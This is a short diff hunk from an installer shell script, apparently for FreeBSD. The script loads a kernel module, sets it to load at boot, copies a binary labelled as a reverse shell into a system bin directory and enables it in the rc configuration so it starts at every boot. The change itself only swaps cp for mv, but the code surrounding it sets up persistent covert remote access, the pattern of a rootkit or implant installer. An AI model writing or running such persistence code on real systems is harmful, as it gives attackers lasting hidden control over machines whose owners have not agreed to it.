@@ -56,13 +56,13 @@ kldload $INSTALL/$KO
 echo ""$NAME"_load=\"YES\"" > $LOADER_CONF
 
 echo ">> Install revershell shell for boot."
-cp $BINARIES/$RSHELL_BIN $USR_BIN/
+mv $BINARIES/$RSHELL_BIN $USR_BIN/
 
 echo ">> Enable reverse-shell on boot."
 echo "${RSHELL_CONF_FILE}_enable=\"YES\"" >> $RSHELL_CONF
 
 echo ">> Move configuration file into rc."
-cp $BINARIES/$RSHELL_CONF_FILE $RSHELL_INSTALL
+mv $BINARIES/$RSHELL_CONF_FILE $RSHELL_INSTALL/
 
 if [ "$1" = "DEBUG" ]
 then
